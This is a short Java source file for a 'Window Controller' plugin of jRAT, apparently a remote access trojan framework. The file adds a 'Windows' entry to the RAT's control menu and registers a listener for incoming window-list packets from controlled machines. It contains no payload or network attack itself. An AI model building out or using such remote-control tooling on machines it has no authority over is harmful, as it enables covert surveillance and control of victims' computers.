package jrat.plugin.window.client;

import jrat.api.Plugin;
import jrat.api.net.Packet;
import jrat.api.ui.RATControlMenuEntry;

import javax.swing.ImageIcon;

public class WindowPlugin extends Plugin {
	
	public static final short HEADER_LIST = -127;

	public WindowPlugin() {
		super("Window Controller", "1.0", "Window Controller Plugin", "jRAT");

		try {
			icon = new ImageIcon(getResource("icons/windows.png"));
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		RATControlMenuEntry entry = new RATControlMenuEntry("Windows", icon, WindowPanel.class);		
		RATControlMenuEntry.addEntry(entry);

		Packet.registerIncoming(HEADER_LIST, new ListPacketListener());
	}

}
